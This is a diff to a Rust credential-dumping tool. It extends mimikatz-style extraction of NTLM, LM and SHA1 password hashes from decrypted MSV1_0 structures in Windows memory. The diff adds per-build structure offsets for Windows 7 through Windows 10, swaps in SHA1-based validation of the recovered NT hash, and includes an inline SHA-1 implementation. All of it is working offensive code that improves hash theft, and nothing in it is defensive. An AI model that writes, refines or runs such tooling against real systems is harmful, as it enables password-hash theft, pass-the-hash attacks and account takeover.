@@ -42,16 +42,17 @@ struct PrimaryCredOffsets {
 // Multiple offset sets for different Windows builds:
 const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
     // Variant 0: Windows 10 22H2 (build 19045) - empirically verified
-    //   DPAPIProtected at +0x36 (20 bytes), no align3/align4/align5
-    //   +0x4A: NtOwfPassword (16), +0x5A: LmOwfPassword (16), +0x6A: ShaOwPassword (20)
     PrimaryCredOffsets { nt_hash: 0x4A, lm_hash: 0x5A, sha1_hash: 0x6A },
-    // Variant 1: Older Win10 1607+ (mimikatz KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607)
-    //   DPAPIProtected at +0x38 (16 bytes) + align5 (4 bytes)
-    //   +0x4C: NtOwfPassword, +0x5C: LmOwfPassword, +0x6C: ShaOwPassword
+    // Variant 1: Win10 1607+ (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607)
     PrimaryCredOffsets { nt_hash: 0x4C, lm_hash: 0x5C, sha1_hash: 0x6C },
-    // Variant 2: Even older or with 8-byte aligned DPAPIProtected
-    //   +0x50: NtOwfPassword, +0x60: LmOwfPassword, +0x70: ShaOwPassword
+    // Variant 2: Win10 1607+ larger DPAPIProtected alignment
     PrimaryCredOffsets { nt_hash: 0x50, lm_hash: 0x60, sha1_hash: 0x70 },
+    // Variant 3: Win10 1507/1511 (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_OLD)
+    // isIso(1)+isNtOwf(1)+isLmOwf(1)+isSha(1)+align(4) = 8 bytes at +0x20 → hashes at +0x28
+    PrimaryCredOffsets { nt_hash: 0x28, lm_hash: 0x38, sha1_hash: 0x48 },
+    // Variant 4: Win7 SP1 / Win8 / Win8.1 / Server 2008R2-2012R2
+    // No isIso, no DPAPIProtected. Hashes directly after UserName.
+    PrimaryCredOffsets { nt_hash: 0x20, lm_hash: 0x30, sha1_hash: 0x40 },
 ];
 
 /// Extract MSV1_0 credentials (NTLM hashes) from msv1_0.dll.
@@ -724,10 +725,9 @@ fn extract_primary_credential(
         log::debug!("    {:04x}: {}  {}", i * 16, hex_str, ascii);
     }
 
-    // Read boolean flags to validate offset selection
-    let is_lm_owf = if decrypted.len() > 0x2A { decrypted[0x2A] != 0 } else { false };
-
-    // Try each offset variant and pick the one that makes sense
+    // Try each offset variant and pick the one that makes sense.
+    // Validation: NT hash should be non-zero. LM hash is zero on most modern systems.
+    // SHA1 = SHA1(NT hash) provides cross-validation when NT is non-zero.
     let mut best_result: Option<RawPrimaryCred> = None;
 
     for (vi, offsets) in PRIMARY_CRED_OFFSET_VARIANTS.iter().enumerate() {
@@ -746,19 +746,17 @@ fn extract_primary_credential(
         lm_hash.copy_from_slice(&decrypted[lm_off..lm_off + 16]);
         sha1_hash.copy_from_slice(&decrypted[sha1_off..sha1_off + 20]);
 
-        // Validate: if isLmOwf=0, LM hash must be all zeros
-        let lm_valid = if !is_lm_owf {
-            lm_hash == [0u8; 16]
-        } else {
-            lm_hash != [0u8; 16] // Should be non-zero if flag is set
-        };
+        // NT hash must be non-zero
+        if nt_hash == [0u8; 16] {
+            continue;
+        }
 
-        // NT hash should be non-zero (if we got here, the structure claims to have one)
-        let nt_nonzero = nt_hash != [0u8; 16];
+        // Cross-validate: SHA1(NT) should match sha1_hash (strongest validation)
+        let sha1_valid = sha1_digest(&nt_hash) == sha1_hash;
 
-        if lm_valid && nt_nonzero {
+        if sha1_valid {
             log::info!(
-                "  Using primary cred offset variant {} (nt=0x{:x}, lm=0x{:x}, sha1=0x{:x})",
+                "  Using primary cred offset variant {} (nt=0x{:x}, lm=0x{:x}, sha1=0x{:x}) [SHA1 validated]",
                 vi, offsets.nt_hash, offsets.lm_hash, offsets.sha1_hash
             );
             best_result = Some(RawPrimaryCred { lm_hash, nt_hash, sha1_hash });
@@ -784,4 +782,47 @@ fn extract_primary_credential(
     }
 
     Ok(best_result.unwrap())
+}
+
+/// Minimal inline SHA-1 for cross-validating NT hash against SHA1 field.
+/// Avoids external crate dependency.
+fn sha1_digest(data: &[u8]) -> [u8; 20] {
+    let (mut h0, mut h1, mut h2, mut h3, mut h4) =
+        (0x67452301u32, 0xEFCDAB89u32, 0x98BADCFEu32, 0x10325476u32, 0xC3D2E1F0u32);
+    let bit_len = (data.len() as u64) * 8;
+    let mut msg = data.to_vec();
+    msg.push(0x80);
+    while msg.len() % 64 != 56 {
+        msg.push(0);
+    }
+    msg.extend_from_slice(&bit_len.to_be_bytes());
+    for block in msg.chunks(64) {
+        let mut w = [0u32; 80];
+        for i in 0..16 {
+            w[i] = u32::from_be_bytes([block[i * 4], block[i * 4 + 1], block[i * 4 + 2], block[i * 4 + 3]]);
+        }
+        for i in 16..80 {
+            w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
+        }
+        let (mut a, mut b, mut c, mut d, mut e) = (h0, h1, h2, h3, h4);
+        for i in 0..80 {
+            let (f, k) = match i {
+                0..=19 => ((b & c) | ((!b) & d), 0x5A827999u32),
+                20..=39 => (b ^ c ^ d, 0x6ED9EBA1u32),
+                40..=59 => ((b & c) | (b & d) | (c & d), 0x8F1BBCDCu32),
+                _ => (b ^ c ^ d, 0xCA62C1D6u32),
+            };
+            let temp = a.rotate_left(5).wrapping_add(f).wrapping_add(e).wrapping_add(k).wrapping_add(w[i]);
+            e = d; d = c; c = b.rotate_left(30); b = a; a = temp;
+        }
+        h0 = h0.wrapping_add(a); h1 = h1.wrapping_add(b); h2 = h2.wrapping_add(c);
+        h3 = h3.wrapping_add(d); h4 = h4.wrapping_add(e);
+    }
+    let mut r = [0u8; 20];
+    r[0..4].copy_from_slice(&h0.to_be_bytes());
+    r[4..8].copy_from_slice(&h1.to_be_bytes());
+    r[8..12].copy_from_slice(&h2.to_be_bytes());
+    r[12..16].copy_from_slice(&h3.to_be_bytes());
+    r[16..20].copy_from_slice(&h4.to_be_bytes());
+    r
 }
